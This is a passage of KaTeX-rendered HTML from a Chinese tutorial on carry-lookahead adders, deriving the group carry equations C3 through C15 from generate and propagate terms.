style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是第8小组的传送条件，与外来进位无关，只是负责传递外来进位。</p><p>同理我们有：</p><ul><li>第7小组<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>7</mn></msub><mo>=</mo><msub><mi>D</mi><mn>7</mn></msub><mo>+</mo><msub><mi>T</mi><mn>7</mn></msub><mo>+</mo><msub><mi>C</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">C_7=D_7+T_7+C_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li>第6小组<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>11</mn></msub><mo>=</mo><msub><mi>D</mi><mn>6</mn></msub><mo>+</mo><msub><mi>T</mi><mn>6</mn></msub><mo>+</mo><msub><mi>C</mi><mn>7</mn></msub></mrow><annotation encoding="application/x-tex">C_{11}=D_6+T_6+C_7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li>第5小组<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>15</mn></msub><mo>=</mo><msub><mi>D</mi><mn>5</mn></msub><mo>+</mo><msub><mi>T</mi><mn>5</mn></msub><mo>+</mo><msub><mi>C</mi><mn>11</mn></msub></mrow><annotation encoding="application/x-tex">C_{15}=D_5+T_5+C_{11}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li></ul><p>依次代入展开可以得到如下表达式：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>C</mi><mn>3</mn></msub><mo>=</mo><msub><mi>D</mi><mn>8</mn></msub><mo>+</mo><msub><mi>T</mi><mn>8</mn></msub><msub><mi>C</mi><mrow><mo>−</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>C</mi><mn>7</mn></msub><mo>=</mo><msub><mi>D</mi><mn>7</mn></msub><mo>+</mo><msub><mi>T</mi><mn>7</mn></msub><msub><mi>C</mi><mn>3</mn></msub><mo>=</mo><msub><mi>D</mi><mn>7</mn></msub><mo>+</mo><msub><mi>T</mi><mn>7</mn></msub><msub><mi>D</mi><mn>8</mn></msub><mo>+</mo><msub><mi>T</mi><mn>7</mn></msub><msub><mi>T</mi><mn>8</mn></msub><msub><mi>C</mi><mrow><mo>−</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>C</mi><mn>11</mn></msub><mo>=</mo><msub><mi>D</mi><mn>6</mn></msub><mo>+</mo><msub><mi>T</mi><mn>6</mn></msub><msub><mi>C</mi><mn>7</mn></msub><mo>=</mo><msub><mi>D</mi><mn>6</mn></msub><mo>+</mo><msub><mi>T</mi><mn>6</mn></msub><msub><mi>D</mi><mn>7</mn></msub><mo>+</mo><msub><mi>T</mi><mn>6</mn></msub><msub><mi>T</mi><mn>7</mn></msub><msub><mi>D</mi><mn>8</mn></msub><mo>+</mo><msub><mi>T</mi><mn>6</mn></msub><msub><mi>T</mi><mn>7</mn></msub><msub><mi>T</mi><mn>8</mn></msub><msub><mi>C</mi><mrow><mo>−</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>C</mi><mn>15</mn></msub><mo>=</mo><msub><mi>D</mi><mn>5</mn></msub><mo>+</mo><msub><mi>T</mi><mn>5</mn></msub><msub><mi>C</mi><mn>11</mn></msub><mo>=</mo><msub><mi>D</mi><mn>5</mn></msub><mo>+</mo><msub><mi>T</mi><mn>5</mn></msub><msub><mi>D</mi><mn>6</mn></msub><mo>+</mo><msub><mi>T</mi><mn>5</mn></msub><msub><mi>T</mi><mn>6</mn></msub><msub><mi>D</mi><mn>7</mn></msub><mo>+</mo><msub><mi>T</mi><mn>5</mn></msub><msub><mi>T</mi><mn>6</mn></msub><msub><mi>T</mi><mn>7</mn></msub><msub><mi>D</mi><mn>8</mn></msub><mo>+</mo><msub><mi>T</mi><mn>5</mn></msub><msub><mi>T</mi><mn>6</mn></msub><msub><mi>T</mi><mn>7</mn></msub><msub><mi>T</mi><mn>8</mn></msub><msub><mi>C</mi><mrow><mo>−</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}C_{3}=D_{8}+T_{8} C_{-1} \\C_{7}=D_{7}+T_{7} C_{3}=D_{7}+T_{7} D_{8}+T_{7} T_{8} C_{-1} \\C_{11}=D_{6}+T_{6} C_{7}=D_{6}+T_{6} D_{7}+T_{6} T_{7} D_{8}+T_{6} T_{7} T_{8} C_{-1} \\C_{15}=D_{5}+T_{5} C_{11}=D_{5}+T_{5} D_{6}+T_{5} T_{6} D_{7}+T_{5} T_{6} T_{7} D_{8}+T_{5} T_{6} T_{7} T_{8} C_{-1}\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.800000000000001em;vertical-align:-2.1500000000000004em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.6500000000000004em;"><span style="top:-4.8100000000000005em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span 